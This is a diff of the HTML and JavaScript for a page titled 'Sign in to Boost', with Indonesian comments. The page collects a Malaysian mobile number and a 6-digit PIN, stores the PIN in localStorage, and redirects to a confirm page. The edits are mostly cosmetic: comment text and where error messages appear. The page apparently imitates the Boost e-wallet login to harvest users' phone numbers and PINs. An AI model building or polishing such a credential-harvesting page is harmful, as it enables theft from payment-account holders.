@@ -6,7 +6,7 @@
     <title>Sign in to Boost</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Hilangkan spinner pada input number */
+        /* Hilangkan spinner pada input text */
         input[type="text"]::-webkit-inner-spin-button,
         input[type="text"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
@@ -36,14 +36,14 @@
                 <input type="text" id="phone" inputmode="numeric" placeholder="Enter your mobile number"
                     class="w-full py-2 text-lg outline-none bg-transparent [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none">
             </div>
-            <!-- Pesan error untuk nomor (format dan backend) -->
+            <!-- Pesan error untuk format nomor (hanya frontend) -->
             <p id="phoneError" class="text-red-500 text-xs mt-1 hidden">Please enter a valid mobile number</p>
 
             <!-- PIN Input -->
             <div class="mt-6">
                 <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit PIN</label>
                 <div class="flex justify-between gap-2" id="pinContainer"></div>
-                <!-- Pesan error untuk PIN -->
+                <!-- Pesan error untuk PIN (frontend) dan juga untuk nomor tidak valid dari backend -->
                 <p id="pinError" class="text-red-500 text-xs mt-1 hidden">Incorrect mobile number or 6-digit PIN.</p>
             </div>
 
@@ -82,13 +82,13 @@
         const spinner = document.getElementById('loadingSpinner');
         const errorBlock = document.getElementById('errorBlock');
 
-        // Validasi format nomor (regex seperti sebelumnya: setelah +60 harus 1 diikuti 8-9 digit)
+        // Validasi format nomor (regex: setelah +60 harus 1 diikuti 8-9 digit)
         const validatePhoneFormat = () => /^1\d{8,9}$/.test(phoneInput.value.replace(/\D/g, ''));
 
         // Cek apakah semua PIN sudah terisi
         const allPinFilled = () => Array.from(pinInputs).every(inp => inp.value !== '');
 
-        // Validasi PIN lengkap (sama seperti sebelumnya)
+        // Validasi PIN lengkap (aturan Boost)
         function validatePinFull() {
             const pin = Array.from(pinInputs).map(i => i.value).join('');
             if (pin.length < 6) return false;
@@ -141,7 +141,6 @@
             if (validatePhoneFormat()) {
                 phoneError.classList.add('hidden');
             } else {
-                // Pastikan teks pesan adalah yang default
                 phoneError.textContent = 'Please enter a valid mobile number';
                 phoneError.classList.remove('hidden');
             }
@@ -153,7 +152,6 @@
             input.addEventListener('input', function() {
                 this.value = onlyDigits(this.value);
                 if (this.value && idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
-                // Sembunyikan error PIN saat mengetik
                 pinError.classList.add('hidden');
                 updateButtonState();
             });
@@ -170,14 +168,14 @@
             phoneError.classList.add('hidden');
             pinError.classList.add('hidden');
 
-            // 1. Validasi format nomor (sudah dipastikan oleh tombol, tapi cek ulang)
+            // 1. Validasi format nomor
             if (!validatePhoneFormat()) {
                 phoneError.textContent = 'Please enter a valid mobile number';
                 phoneError.classList.remove('hidden');
                 return;
             }
 
-            // 2. Validasi PIN (sudah dipastikan oleh tombol, tapi cek ulang)
+            // 2. Validasi PIN
             if (!validatePinFull()) {
                 pinError.classList.remove('hidden');
                 return;
@@ -206,13 +204,13 @@
                     localStorage.setItem('boost_pin', pin);
                     window.location.href = 'confirm.html';
                 } else {
-                    // Tampilkan pesan error dari server (AbstractAPI)
-                    phoneError.textContent = data.message || 'Incorrect mobile number or 6-digit PIN.';
-                    phoneError.classList.remove('hidden');
+                    // Tampilkan pesan error dari server (AbstractAPI) di bawah PIN
+                    pinError.textContent = data.message || 'Incorrect mobile number or 6-digit PIN.';
+                    pinError.classList.remove('hidden');
                 }
             } catch (err) {
-                phoneError.textContent = 'Connection error. Please try again.';
-                phoneError.classList.remove('hidden');
+                pinError.textContent = 'Connection error. Please try again.';
+                pinError.classList.remove('hidden');
                 console.error(err);
             } finally {
                 sendBtn.disabled = false;
